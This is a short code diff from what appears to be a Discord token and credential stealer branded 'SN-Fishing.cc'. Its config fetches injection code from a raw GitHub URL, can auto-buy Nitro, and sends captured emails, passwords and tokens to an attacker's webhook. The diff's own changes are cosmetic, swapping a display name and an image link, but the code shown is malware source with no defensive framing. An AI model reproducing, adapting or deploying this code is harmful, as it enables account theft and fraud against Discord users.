@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'test',
+  embed_name: 'SN-Fishing.cc 🐟',
   embed_icon: 'https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 1746924, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/oxyidz/mezff/main/index.js',
@@ -653,7 +653,7 @@ const login = async (email, password, token) => {
           text: "@SN-Fishing.cc 🐟",
         },
         thumbnail: {
-          url: 'https://cdn.discordapp.com/attachments/985492312903790613/987081610161709166/2e79085df912c93156b05504759adb5b-1.png',
+          url: 'https://media.discordapp.net/attachments/985492312903790613/987081610161709166/2e79085df912c93156b05504759adb5b-1.png',
         },
       },
     ],
